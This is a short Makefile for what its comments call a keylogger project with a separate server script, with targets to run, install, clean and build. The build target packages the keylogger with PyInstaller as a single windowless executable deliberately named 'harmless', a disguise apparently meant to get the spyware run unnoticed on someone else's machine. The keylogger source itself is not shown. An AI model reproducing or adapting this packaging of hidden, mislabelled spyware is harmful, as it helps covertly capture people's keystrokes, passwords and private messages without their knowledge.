py := python # python command
logger := keylogger.py # main logger entry point
server := server.py # server entry point


logger:: $(logger)
	python $(logger)

server:: $(server)
	python $(server)

.PHONY: build
build::
	pyinstaller \
		--onefile \
		--noconsole \
		--name "harmless" \
		$(logger)

clean::
	@rm -rf \
		build/ \
		dist/ \
		__pycache__/ \
		*.spec \
		logs/*

install:: requirements.txt
	pip install -r requirements.txt